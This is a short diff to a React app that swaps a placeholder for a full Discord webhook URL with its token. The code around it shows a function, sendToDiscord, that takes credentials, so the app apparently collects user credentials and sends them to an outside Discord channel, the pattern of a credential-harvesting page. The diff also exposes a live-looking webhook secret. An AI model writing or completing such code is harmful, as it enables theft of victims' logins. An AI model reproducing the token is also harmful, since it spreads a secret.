@@ -10,7 +10,7 @@ const App = () => {
   const [isLoading, setIsLoading] = useState(false);
 
   // Discord webhook URL - User needs to provide this
-  const DISCORD_WEBHOOK_URL = "REPLACE_WITH_YOUR_DISCORD_WEBHOOK_URL";
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1386316409859997776/5a_bGU79X1WWbf9-wafzCm5zlg5GaZqSAHbfPOFU9dqNnmhD261WSh3IhCR7cDx6W8_O";
 
   const sendToDiscord = async (credentials) => {
     try {
